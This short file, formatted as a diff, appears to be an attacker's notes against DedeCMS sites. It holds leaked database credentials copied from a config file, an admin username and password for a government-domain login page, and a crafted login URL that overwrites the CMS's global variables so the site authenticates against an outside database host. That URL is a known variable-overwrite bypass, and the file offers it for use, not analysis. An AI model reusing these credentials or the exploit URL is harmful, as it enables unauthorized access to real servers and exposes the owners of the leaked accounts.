@@ -1,0 +1,18 @@
+H:/website2/expo.nbol.net/data/common.inc.php
+
+<?php
+//数据库连接信�?
+$cfg_dbhost = 'localhost';
+$cfg_dbname = 'dedecmsv57utf8';
+$cfg_dbuser = 'croot';
+$cfg_dbpwd = 'cynthia888';
+$cfg_dbprefix = 'dede_';
+$cfg_db_language = 'utf8';
+
+
+
+http://expo.nbcxy.gov.cn/dede/login.php?gotopage=%2Fdede%2Findex.php
+admin
+nbol2011
+
+http://222.243.158.152:88/fhzxadmin/login.php?dopost=login&validate=dcug&userid=admin&pwd=nbol2011&_POST[GLOBALS][cfg_dbhost]=115.238.164.58&_POST[GLOBALS][cfg_dbuser]=croot&_POST[GLOBALS][cfg_dbpwd]=cynthia888&_POST[GLOBALS][cfg_dbname]=dedecmsv57utf8
